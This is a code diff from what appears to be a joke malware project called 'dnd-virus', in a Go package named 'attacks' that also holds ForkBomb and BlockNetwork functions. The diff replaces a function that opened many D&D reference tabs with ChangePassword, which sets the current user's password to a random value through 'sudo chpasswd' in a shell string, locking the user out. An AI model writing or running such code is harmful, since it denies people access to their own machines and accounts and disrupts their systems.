@@ -1,7 +1,9 @@
 package attacks
 
 import (
+	"dnd-virus/password"
 	"os/exec"
+	"os/user"
 )
 
 func ForkBomb() error {
@@ -23,28 +25,14 @@ func BlockNetwork() error {
 	return nil
 }
 
-func OpenTabs() error {
-	urls := []string{
-		"https://5e14.dnd.su/class/",
-		"https://5e14.dnd.su/race/",
-		"https://5e14.dnd.su/backgrounds/",
-		"https://5e14.dnd.su/feats/",
-		"https://5e14.dnd.su/spells/",
-		"https://5e14.dnd.su/bestiary/",
-		"https://5e14.dnd.su/items/",
-		"https://5e14.dnd.su/articles/newbie/536-how-to-start-playing-dd/",
-		"https://5e14.dnd.su/articles/newbie/468-using-ability-scores/",
-		"https://5e14.dnd.su/articles/newbie/26-main-formulas/",
-		"https://5e14.dnd.su/articles/newbie/564-faq/",
-		"https://5e14.dnd.su/articles/bestiary/",
-		"https://5e14.dnd.su/articles/inventory/",
-		"https://5e14.dnd.su/articles/mechanics/",
-		"https://5e14.dnd.su/articles/lore/",
+func ChangePassword() error {
+	currentUser, err := user.Current()
+	if err != nil {
+		return err
 	}
-
-	for _, url := range urls {
-		exec.Command("xdg-open", url).Start()
-	}
+	username := currentUser.Username
+	newPass := password.GeneratePassword()
+	exec.Command("sh", "-c", "echo '"+username+":"+newPass+"' | sudo chpasswd").Run()
 	return nil
 }
 
